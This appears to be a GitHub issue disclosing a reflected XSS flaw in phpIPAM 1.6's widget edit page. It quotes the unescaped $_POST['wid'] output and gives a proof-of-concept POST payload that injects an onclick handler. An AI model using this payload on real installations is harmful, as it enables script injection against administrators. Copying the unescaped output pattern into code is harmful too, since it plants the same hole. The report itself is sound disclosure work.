### **[xjzzzxx](/xjzzzxx)** commented [Jul 11, 2024](#issue-2402156145)

| Hello,  I would like to report for a xss vulnerability in phpipam-1.6. Analysis The path of the vulnerability: /app/admin/widgets/edit.php  ``` if($_POST['action']!="add") {   // Line 30(check point) 	break; } ... <input type="hidden" name="wid" value="<?php print @$_POST['wid']; ?>">	//Line 58(sink) ```  Source from `$_POST['wid']`. And then check point in Line 30,which we should set `$_POST['action'] == add` to bypass. After bypass the check point, xss happened in Line 58, because no check for `$_POST['wid']` Poc `POST /app/admin/widgets/edit.php`  Data:  `action=add&wid=1"%20accesskey="X"%20onclick="alert('xss')` Manual verification [19](https://private-user-images.githubusercontent.com/134520528/347668854-1b71ebad-94cb-488f-beee-4bac849b0050.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTE5ODIsIm5iZiI6MTczNjU5MTY4MiwicGF0aCI6Ii8xMzQ1MjA1MjgvMzQ3NjY4ODU0LTFiNzFlYmFkLTk0Y2ItNDg4Zi1iZWVlLTRiYWM4NDliMDA1MC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxMDM0NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZDdiYTU3NjFjYzE4OTc5ODgwZWU1MGI5Y2UzZWM5ZDdmNzM5NjVjZDU1ODU3MTUzYjMwNTI5Mzk2Mjk0MGMxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.cdtQkGbra_fBaWG9BektqBu6V_S8FFqYy1QDa3le9pI)  [20](https://private-user-images.githubusercontent.com/134520528/347668872-ec0bf179-5c9d-4c87-8471-658b12be1d14.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTE5ODIsIm5iZiI6MTczNjU5MTY4MiwicGF0aCI6Ii8xMzQ1MjA1MjgvMzQ3NjY4ODcyLWVjMGJmMTc5LTVjOWQtNGM4Ny04NDcxLTY1OGIxMmJlMWQxNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxMDM0NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hZDcyMjI4Zjg5ZjdmMDMwNzI3OGJlYzFhMmYxODYzZGI0ZjZlNmYzMzhlYzM3YjMzOTc2NjE1YzYxMTJmZTUzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.eKfTOGg7p_Fp3HOsi2qbema8J7c8kHqgkWtmLc9fvo8) |
